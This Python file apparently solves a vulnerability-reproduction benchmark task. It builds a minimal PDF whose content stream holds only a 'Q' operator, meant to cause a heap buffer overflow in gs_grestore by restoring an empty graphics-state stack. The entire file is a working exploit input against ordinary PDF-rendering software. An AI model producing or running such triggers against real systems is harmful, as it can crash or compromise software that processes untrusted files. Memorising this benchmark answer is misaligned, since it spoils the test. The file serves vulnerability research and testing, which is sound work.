import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in gs_grestore, triggered by
        # a 'Q' operator (restore graphics state) on an empty state stack.
        # This PoC is a minimal PDF with a content stream containing only 'Q'.
        content = b"Q"
        
        # Use an in-memory buffer to construct the PDF and track object offsets.
        pdf_buffer = io.BytesIO()

        # PDF Header
        pdf_buffer.write(b"%PDF-1.7\n")

        # Object offsets will be stored here.
        offsets = {}

        # Object 1: Catalog
        offsets[1] = pdf_buffer.tell()
        pdf_buffer.write(b"1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n")

        # Object 2: Page Tree
        offsets[2] = pdf_buffer.tell()
        pdf_buffer.write(b"2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n")

        # Object 3: Page
        offsets[3] = pdf_buffer.tell()
        pdf_buffer.write(b"3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]/Contents 4 0 R>>\nendobj\n")

        # Object 4: Content Stream with the trigger
        offsets[4] = pdf_buffer.tell()
        stream_dict = b"<</Length %d>>" % len(content)
        stream_content = b"stream\n" + content + b"\nendstream"
        pdf_buffer.write(b"4 0 obj\n" + stream_dict + b"\n" + stream_content + b"\nendobj\n")

        # Cross-reference (xref) table
        xref_start = pdf_buffer.tell()
        num_objects = len(offsets) + 1
        pdf_buffer.write(b"xref\n")
        pdf_buffer.write(f"0 {num_objects}\n".encode())
        pdf_buffer.write(b"0000000000 65535 f \n")
        for i in sorted(offsets.keys()):
            pdf_buffer.write(f"{offsets[i]:010d} 00000 n \n".encode())

        # PDF Trailer
        pdf_buffer.write(b"trailer\n")
        pdf_buffer.write(b"<</Size %d/Root 1 0 R>>\n" % num_objects)
        pdf_buffer.write(b"startxref\n")
        pdf_buffer.write(str(xref_start).encode())
        pdf_buffer.write(b"\n%%EOF")

        return pdf_buffer.getvalue()
